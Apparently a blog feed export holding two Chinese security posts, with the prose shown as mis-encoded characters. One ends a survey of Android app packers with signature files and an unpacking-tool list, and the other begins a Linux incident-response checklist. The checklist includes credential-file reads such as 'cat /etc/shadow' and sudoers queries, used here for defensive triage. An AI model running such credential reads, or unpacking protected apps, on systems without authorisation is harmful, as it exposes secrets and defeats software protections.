å›º</td><td>libdemolish.so<br/>libdemolishdata.so</td><td></td></tr><tr><td>é˜¿é‡Œèšå®‰å…¨</td><td>assets&#x2F;armeabi&#x2F;libfakejni.so<br/>assets&#x2F;libzumadata.so<br/>assets&#x2F;libpreverify1.so<br/>aliprotect.dat<br/>libdemolish.so<br/>libfakejni.so<br/>libmobisec.so<br/>libsgmain.so<br/>assets&#x2F;libzuma.so<br/>libzumadata.so<br/>libdemolishdata.so<br/>libpreverify1.so<br/>libsgsecuritybody.so</td><td></td></tr><tr><td>é¡¶åƒç§‘æŠ€</td><td>libx3g.so<br/>libjni.so<br/>lib&#x2F;armeabi&#x2F;libx3g.so</td><td>cn.securitystack.stee.AppStub</td></tr><tr><td>DexProtectåŠ å›º</td><td>assets&#x2F;classes.dex.dat<br/>dp.arm-v7.so.dat<br/>dp.arm.so.dat</td><td></td></tr><tr><td>CFCAåŠ å›º</td><td>libsecenh_a64.so<br/>libsecenh_x86.so<br/>my_classes.jar<br/>libsecenh.so<br/>libbasec.so<br/>libbasec_x86.so</td><td></td></tr><tr><td>OPPOåŠ å›º-oppoæ‰‹æœºåŠ å›º</td><td>OPPOProtect.so<br/>OPPOProtect2019.so<br/>OPPOProtect2020.so<br/>OPPOProtect2021.so<br/>OPPOProtect2022.so<br/>OPPOProtect2023.so</td><td></td></tr><tr><td>OPPOåŠ å›º-å®‰å…¨æ£€æµ‹SDK</td><td>libomesStdSco.so<br/>jni&#x2F;arm64-v8a&#x2F;libomesStdSco.so<br/>jni&#x2F;armeabi-v7a&#x2F;libomesStdSco.so<br/>jni&#x2F;x86&#x2F;libomesStdSco.so<br/>jni&#x2F;x86_64&#x2F;libomesStdSco.so</td><td></td></tr><tr><td>æ·±ç›¾å®‰å…¨åŠ å›ºï¼ˆVirbox Protectorï¼‰</td><td>ibvirbox32.so<br/>libvirbox64.so</td><td></td></tr></tbody></table><h4 id="ç‰¹å¾æ‰¾å¯»æ¡ˆä¾‹"><a href="#ç‰¹å¾æ‰¾å¯»æ¡ˆä¾‹" class="headerlink" title="ç‰¹å¾æ‰¾å¯»æ¡ˆä¾‹"></a>ç‰¹å¾æ‰¾å¯»æ¡ˆä¾‹</h4><p>APP çˆ±åŠ å¯†5ä»£å£³ï¼Œå°† .apk ä¿®æ”¹ä¸º .zip ç„¶åè¿›è¡Œè§£å‹ï¼Œè§£å‹å assets å‘ç°çˆ±åŠ å¯†5ä»£å£³ç‰¹å¾ï¼ŒIJMDal.Data</p><p><a data-fancybox="gallery" data-src="/../images/mobile/reinforce/image-20231207155612690.png" data-caption="image-20231207155612690"><img src="/../images/mobile/reinforce/image-20231207155612690.png" alt="image-20231207155612690"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/reinforce/image-20231208100319417.png" data-caption="image-20231208100319417"><img src="/../images/mobile/reinforce/image-20231208100319417.png" alt="image-20231208100319417"></a></p><p>é€šè¿‡æŸ¥å£³å·¥å…·ï¼Œäº¦èƒ½æŸ¥è¯¢</p><p>![image-20231207153148309](E:\Security file\learning notes\images\image-20231207153148309-17080968561231.png)</p><hr><h2 id="å››ã€è„±å£³æ–¹æ³•åŠå·¥å…·æ±‡æ€»"><a href="#å››ã€è„±å£³æ–¹æ³•åŠå·¥å…·æ±‡æ€»" class="headerlink" title="å››ã€è„±å£³æ–¹æ³•åŠå·¥å…·æ±‡æ€»"></a>å››ã€è„±å£³æ–¹æ³•åŠå·¥å…·æ±‡æ€»</h2><h3 id="å†…å­˜dump"><a href="#å†…å­˜dump" class="headerlink" title="å†…å­˜dump"></a>å†…å­˜dump</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FRIDA-DEXdumpï¼šhttps://github.com/hluwa/FRIDA-DEXDump</span><br></pre></td></tr></table></figure></div><h3 id="æ–‡ä»¶ç›‘è§†"><a href="#æ–‡ä»¶ç›‘è§†" class="headerlink" title="æ–‡ä»¶ç›‘è§†"></a>æ–‡ä»¶ç›‘è§†</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inotifywait-for-Android ï¼šhttps://github.com/dstmath/inotifywait-for-Android</span><br></pre></td></tr></table></figure></div><h3 id="åŠ¨æ€è°ƒè¯•"><a href="#åŠ¨æ€è°ƒè¯•" class="headerlink" title="åŠ¨æ€è°ƒè¯•"></a>åŠ¨æ€è°ƒè¯•</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IDA èµ„æºåœ°å€ï¼šhttps://www.52pojie.cn/thread-1861590-1-1.html</span><br></pre></td></tr></table></figure></div><h3 id="å†…å­˜é‡ç»„"><a href="#å†…å­˜é‡ç»„" class="headerlink" title="å†…å­˜é‡ç»„"></a>å†…å­˜é‡ç»„</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ZjDroid ï¼šhttps://github.com/halfkiss/ZjDroiddumpDex</span><br><span class="line">dumpDex ï¼šhttps://github.com/WrBug/dumpDex</span><br><span class="line">elfrebuild ï¼šhttps://github.com/ylcangel/ElfRebuild</span><br></pre></td></tr></table></figure></div><h3 id="dex2oat"><a href="#dex2oat" class="headerlink" title="dex2oat"></a>dex2oat</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dex2oatHunter ï¼šhttps://github.com/spriteviki/Dex2oatHunte</span><br></pre></td></tr></table></figure></div><h3 id="å®šåˆ¶ç³»ç»Ÿ"><a href="#å®šåˆ¶ç³»ç»Ÿ" class="headerlink" title="å®šåˆ¶ç³»ç»Ÿ"></a>å®šåˆ¶ç³»ç»Ÿ</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FART ï¼šhttps://github.com/hanbinglengyue/FART</span><br><span class="line">BlackDex ï¼šhttps://github.com/CodingGay/BlackDex</span><br></pre></td></tr></table></figure></div><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡è‡ªå®šä¹‰Androidè™šæ‹Ÿæœºï¼Œåœ¨è§£é‡Šå™¨çš„ä»£ç ä¸Šåšè®°å½•ä¸€ä¸ªå‡½æ•°çš„å†…å®¹ï¼ˆCodeItemï¼‰ã€‚æ¥ä¸‹æ¥éå†è§¦å‘æ‰€æœ‰å‡½æ•°ï¼Œä»è€Œè·å–åˆ°å…¨éƒ¨çš„å‡½æ•°å†…å®¹ã€‚æœ€ç»ˆé‡æ–°ç»„è£…æˆä¸€ä¸ªå®Œæ•´çš„DEXæ–‡ä»¶</p><h3 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Xposedï¼šhttps://github.com/ElderDrivers/EdXposedï¼ˆéåŸ Xposedï¼ŒåŸXposedå·²åœæ­¢æ›´æ–°ï¼‰</span><br><span class="line">FRIDAï¼šhttps://github.com/frida/frida</span><br></pre></td></tr></table></figure></div><h2 id="å…­ã€å‚è€ƒ"><a href="#å…­ã€å‚è€ƒ" class="headerlink" title="å…­ã€å‚è€ƒ"></a>å…­ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https://www.isisy.com/1420.html</span><br><span class="line">https://zhuanlan.zhihu.com/p/550084508</span><br><span class="line">https://github.com/moyuwa/ApkCheckPack/tree/main</span><br><span class="line">https://blog.csdn.net/g5703129/article/details/85054405</span><br><span class="line">http://www.wiki.yelbee.top/2020/04/30/%E5%8D%93%E6%8A%A4%E5%B9%B3%E5%8F%B0%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/%E5%BA%94%E7%94%A8%E5%8A%A0%E5%9B%BA/4.1%E5%BA%94%E7%94%A8%E5%8A%A0%E5%9B%BA%E6%A6%82%E8%BF%B0/</span><br><span class="line">https://bbs.kanxue.com/thread-274793.htm</span><br><span class="line">https://cloud.tencent.com/developer/article/2284277</span><br><span class="line">https://onejane.github.io/2021/02/21/%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3%E4%B9%8B%E5%88%86%E7%B1%BB%E6%8A%80%E6%9C%AF/#%E7%AC%AC%E4%BA%8C%E4%BB%A3%E5%A3%B3-dex%E6%8A%BD%E5%8F%96%E4%B8%8E%E5%8A%A0%E5%9B%BA</span><br><span class="line">https://dun.163.com/news/p/760c8c1ad4ee4349951646d85814264d</span><br><span class="line">https://www.dingxiang-inc.com/blog/post/2</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APPæµ‹è¯•ç³»åˆ— </category>
          
          <category> ç§»åŠ¨å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŠ å›ºå² </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux åº”æ€¥å“åº”æ’æŸ¥æ€è·¯</title>
      <link href="/2023/10/22/Linux%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF/"/>
      <url>/2023/10/22/Linux%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>åº”æ€¥å“åº” Linux ç¯‡å¹…ï¼Œç”±äºæˆ‘ä»¬å¹³å¸¸ä½¿ç”¨ Windows ç³»ç»Ÿè¾ƒä¸ºç†Ÿç»ƒï¼Œå¯¹äº Linux å¹³å°é€šå¸¸æˆ–ä¼šä»…é™äºæ™®é€šæœåŠ¡æ­å»ºä½¿ç”¨ï¼Œä¸ä¼šæ·±å…¥çš„äº†è§£å…¶ã€‚æ—¥å¸¸å·¥ä½œä¼šé‡åˆ° Linux æœåŠ¡å™¨çš„åº”æ€¥å“åº”å·¥ä½œï¼Œäºæ˜¯è®°å½•ä¸‹ä»¥ä¾¿åç»­çš„å·¥ä½œèƒ½é¡ºåˆ©çš„å¼€å±•ã€‚</p><h2 id="äºŒã€åº”æ€¥æµç¨‹"><a href="#äºŒã€åº”æ€¥æµç¨‹" class="headerlink" title="äºŒã€åº”æ€¥æµç¨‹"></a>äºŒã€åº”æ€¥æµç¨‹</h2><p>æ¥åˆ°åº”æ€¥äº‹ä»¶ï¼Œåº”æ€¥äººå‘˜åº”å…ˆå……åˆ†äº†è§£äº‹ä»¶è¯¦æƒ…ï¼Œå…·ä½“åº”æ€¥äº‹ä»¶çš„ç±»å‹æ˜¯æ¶æ„æ”»å‡»ã€è •è™«æ”»å‡»ã€ä¸Šçº§é€šæŠ¥è¿˜æ˜¯ç–‘ä¼¼æ”»å‡»ç­‰ã€‚å……åˆ†äº†è§£äº‹ä»¶è¿‡ç¨‹å¯¹åº”æ€¥æ’æŸ¥èµ·å…³é”®ä½œç”¨ï¼Œå…å¾—åšæ— ç”¨åŠŸäº‹ã€‚</p><p><strong>åº”æ€¥å‰æœŸ</strong></p><p>å¼€å§‹æ’æŸ¥å‰ï¼Œåº”è¯¢é—®æ˜¯å¦æœ‰å®‰å…¨è®¾å¤‡ï¼Œè‹¥æœ‰ï¼Œå¯é€šè¿‡å®‰å…¨å¹³å°é’ˆå¯¹åº”æ€¥äº‹ä»¶ç±»å‹æŸ¥çœ‹æ—¥å¿—è·å–æœ‰ç”¨ä¿¡æ¯ï¼Œè‹¥å·²æ•è·ç›¸å…³æ ·æœ¬è¯·æ±‚æä¾›å¼€å±•åˆ†æã€‚</p><h3 id="1ã€æ’æŸ¥æ˜¯å¦æœ‰å¼‚å¸¸çš„ç³»ç»Ÿç”¨æˆ·"><a href="#1ã€æ’æŸ¥æ˜¯å¦æœ‰å¼‚å¸¸çš„ç³»ç»Ÿç”¨æˆ·" class="headerlink" title="1ã€æ’æŸ¥æ˜¯å¦æœ‰å¼‚å¸¸çš„ç³»ç»Ÿç”¨æˆ·"></a>1ã€æ’æŸ¥æ˜¯å¦æœ‰å¼‚å¸¸çš„ç³»ç»Ÿç”¨æˆ·</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹ç”¨æˆ·</span><br><span class="line">cat /etc/passwd</span><br><span class="line">æ ¼å¼ï¼šç”¨æˆ·åï¼šå¯†ç ï¼šç”¨æˆ·IDï¼šç»„IDï¼šç”¨æˆ·è¯´æ˜ï¼šå®¶ï¼ˆhomeï¼‰ç›®å½•ï¼šç™»é™†ä¹‹åshell</span><br><span class="line">æ— å¯†ç åªå…è®¸æœ¬æœºç™»é™†ï¼Œè¿œç¨‹ä¸å…è®¸sshç™»é™†</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124511958.png" data-caption="image-20230215124511958"><img src="/../images/emergency/linux/image-20230215124511958.png" alt="image-20230215124511958"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹åŠ å¯†å¯†ç </span><br><span class="line">cat /etc/shadow</span><br><span class="line">ç”¨æˆ·åï¼šåŠ å¯†å¯†ç ï¼šå¯†ç æœ€åä¸€æ¬¡ä¿®æ”¹æ—¥æœŸï¼šä¸¤æ¬¡å¯†ç çš„ä¿®æ”¹æ—¶é—´é—´éš”ï¼šå¯†ç æœ‰æ•ˆæœŸï¼šå¯†ç ä¿®æ”¹åˆ°æœŸåˆ°çš„è­¦å‘Šå¤©æ•°ï¼šå¯†ç è¿‡æœŸä¹‹åçš„å®½é™å¤©æ•°ï¼šè´¦å·å¤±æ•ˆæ—¶é—´ï¼šä¿ç•™å­—æ®µ</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124605002.png" data-caption="image-20230215124605002"><img src="/../images/emergency/linux/image-20230215124605002.png" alt="image-20230215124605002"></a></p><h3 id="2ã€æ’æŸ¥è´¦å·ä¿¡æ¯ï¼ˆæŒ‰ç…§å®é™…æƒ…å†µæŸ¥è¯¢ï¼‰"><a href="#2ã€æ’æŸ¥è´¦å·ä¿¡æ¯ï¼ˆæŒ‰ç…§å®é™…æƒ…å†µæŸ¥è¯¢ï¼‰" class="headerlink" title="2ã€æ’æŸ¥è´¦å·ä¿¡æ¯ï¼ˆæŒ‰ç…§å®é™…æƒ…å†µæŸ¥è¯¢ï¼‰"></a>2ã€æ’æŸ¥è´¦å·ä¿¡æ¯ï¼ˆæŒ‰ç…§å®é™…æƒ…å†µæŸ¥è¯¢ï¼‰</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥è¯¢ç‰¹æƒè´¦æˆ· &amp; ç»„</span><br><span class="line">cat /etc/passwd | awk -F: &#x27;$3==0&#123;print $1&#125;&#x27;</span><br><span class="line"></span><br><span class="line"># å¯ä»¥è¿œç¨‹ç™»å½•çš„è´¦å·</span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹å“ªäº›ç”¨æˆ·ä½¿ç”¨shell</span><br><span class="line">cat /etc/passwd | grep /bin/bash</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹å“ªäº›ç”¨æˆ·ä¸ºrootæƒé™</span><br><span class="line">cat /etc/passwd | grep x:0</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹é™¤äº†ä¸å¯ç™»å½•ä»¥å¤–çš„ç”¨æˆ·éƒ½æœ‰å“ªäº›ï¼Œæœ‰æ²¡æœ‰æ–°å¢çš„</span><br><span class="line">cat /etc/passwd | grep -v nologin</span><br><span class="line"></span><br><span class="line"># æŸ¥è¯¢ç³»ç»Ÿä¸­æ‰€æœ‰è´¦æˆ·</span><br><span class="line">cat /etc/passwd | awk -F: &#x27;&#123;print $1&#125;&#x27;</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹å½“å‰ç™»å½•ç”¨æˆ·ï¼ˆtty æœ¬åœ°ç™»é™†  pts è¿œç¨‹ç™»å½•ï¼‰</span><br><span class="line">who</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼Œæƒ³çŸ¥é“æŸä¸€æ—¶åˆ»ç”¨æˆ·çš„è¡Œä¸º</span><br><span class="line">w</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹ç™»é™†å¤šä¹…ã€å¤šå°‘ç”¨æˆ·ï¼Œè´Ÿè½½</span><br><span class="line">uptime</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹å¯†ç æ–‡ä»¶ä¸Šä¸€æ¬¡ä¿®æ”¹çš„æ—¶é—´</span><br><span class="line">stat /etc/passwd</span><br><span class="line"></span><br><span class="line"># æŸ¥è¯¢ sudo æƒé™è´¦æˆ·</span><br><span class="line">more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥è¯¢ç‰¹æƒè´¦æˆ· &amp; ç»„</span><br><span class="line">cat /etc/passwd | awk -F: &#x27;$3==0&#123;print $1&#125;&#x27;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124650630.png" data-caption="image-20230215124650630"><img src="/../images/emergency/linux/image-20230215124650630.png" alt="image-20230215124650630"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># å¯ä»¥è¿œç¨‹ç™»å½•çš„è´¦å·</span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124731218.png" data-caption="image-20230215124731218"><img src="/../images/emergency/linux/image-20230215124731218.png" alt="image-20230215124731218"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹å“ªäº›ç”¨æˆ·ä½¿ç”¨shell</span><br><span class="line">cat /etc/passwd | grep /bin/bash</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124750562.png" data-caption="image-20230215124750562"><img src="/../images/emergency/linux/image-20230215124750562.png" alt="image-20230215124750562"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹å“ªäº›ç”¨æˆ·ä¸ºrootæƒé™</span><br><span class="line">cat /etc/passwd | grep x:0</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124811746.png" data-caption="image-20230215124811746"><img src="/../images/emergency/linux/image-20230215124811746.png" alt="image-20230215124811746"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹é™¤äº†ä¸å¯ç™»å½•ä»¥å¤–çš„ç”¨æˆ·éƒ½æœ‰å“ªäº›ï¼Œæœ‰æ²¡æœ‰æ–°å¢çš„</span><br><span class="line">cat /etc/passwd | grep -v nologin</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124837096.png" data-caption="image-20230215124837096"><img src="/../images/emergency/linux/image-20230215124837096.png" alt="image-20230215124837096"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥è¯¢ç³»ç»Ÿä¸­æ‰€æœ‰è´¦æˆ·</span><br><span class="line">cat /etc/passwd | awk -F: &#x27;&#123;print $1&#125;&#x27;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124859476.png" data-caption="image-20230215124859476"><img src="/../images/emergency/linux/image-20230215124859476.png" alt="image-20230215124859476"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹å½“å‰ç™»å½•ç”¨æˆ·ï¼ˆtty æœ¬åœ°ç™»é™†  pts è¿œç¨‹ç™»å½•ï¼‰</span><br><span class="line">who</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124918880.png" data-caption="image-20230215124918880"><img src="/../images/emergency/linux/image-20230215124918880.png" alt="image-20230215124918880"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼Œæƒ³çŸ¥é“æŸä¸€æ—¶åˆ»ç”¨æˆ·çš„è¡Œä¸º</span><br><span class="line">w</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124933161.png" data-caption="image-20230215124933161"><img src="/../images/emergency/linux/image-20230215124933161.png" alt="image-20230215124933161"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹ç™»é™†å¤šä¹…ã€å¤šå°‘ç”¨æˆ·ï¼Œè´Ÿè½½</span><br><span class="line">uptime</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124949699.png" data-caption="image-20230215124949699"><img src="/../images/emergency/linux/image-20230215124949699.png" alt="image-20230215124949699"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹å¯†ç æ–‡ä»¶ä¸Šä¸€æ¬¡ä¿®æ”¹çš„æ—¶é—´</span><br><span class="line">stat /etc/passwd</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125006235.png" data-caption="image-20230215125006235"><img src="/../images/emergency/linux/image-20230215125006235.png" alt="image-20230215125006235"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥è¯¢ sudo æƒé™è´¦æˆ·</span><br><span class="line">more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125030322.png" data-caption="image-20230215125030322"><img src="/../images/emergency/linux/image-20230215125030322.png" alt="image-20230215125030322"></a></p><h3 id="3ã€æ’æŸ¥å¯ç–‘è¿›ç¨‹"><a href="#3ã€æ’æŸ¥å¯ç–‘è¿›ç¨‹" class="headerlink" title="3ã€æ’æŸ¥å¯ç–‘è¿›ç¨‹"></a>3ã€æ’æŸ¥å¯ç–‘è¿›ç¨‹</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹å…¨éƒ¨è¿›ç¨‹</span><br><span class="line">ps -aux</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹å…³è”è¿›ç¨‹</span><br><span class="line">ps -aux | grep pid</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹cpuå ç”¨æƒ…å†µï¼ˆåŠ¨æ€ï¼‰</span><br><span class="line">top -c -o %CPU</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹CPUå ç”¨å‰åçš„è¿›ç¨‹</span><br><span class="line">ps -eo user,pid,ppid,%mem,%cpu,cmd --sort=-%cpu | head -n 10</span><br><span class="line"></span><br><span class="line"># æŒ‰CPU ä½¿ç”¨ç‡ä»é«˜åˆ°åº•æ’åº</span><br><span class="line">ps -ef --sort -pcpu</span><br><span class="line"></span><br><span class="line"># æŒ‰å†…å­˜ä»é«˜åˆ°ä½</span><br><span class="line">ps -ef --sort -pmem</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125108596.png" data-caption="image-20230215125108596"><img src="/../images/emergency/linux/image-20230215125108596.png" alt="image-20230215125108596"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125313535.png" data-caption="image-20230215125313535"><img src="/../images/emergency/linux/image-20230215125313535.png" alt="image-20230215125313535"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125332381.png" data-caption="image-20230215125332381"><img src="/../images/emergency/linux/image-20230215125332381.png" alt="image-20230215125332381"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125404019.png" data-caption="image-20230215125404019"><img src="/../images/emergency/linux/image-20230215125404019.png" alt="image-20230215125404019"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125434353.png" data-caption="image-20230215125434353"><img src="/../images/emergency/linux/image-20230215125434353.png" alt="image-20230215125434353"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125511429.png" data-caption="image-20230215125511429"><img src="/../images/emergency/linux/image-20230215125511429.png" alt="image-20230215125511429"></a></p><h3 id="4ã€å®šä½å¯ç–‘ç¨‹åºè·¯å¾„"><a href="#4ã€å®šä½å¯ç–‘ç¨‹åºè·¯å¾„" class="headerlink" title="4ã€å®šä½å¯ç–‘ç¨‹åºè·¯å¾„"></a>4ã€å®šä½å¯ç–‘ç¨‹åºè·¯å¾„</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># å®šä½å¯ç–‘è¿›ç¨‹çš„ç¨‹åºæ˜¯ä»€ä¹ˆ</span><br><span class="line">ps -ef | grep pidå·</span><br><span class="line"></span><br><span class="line"># 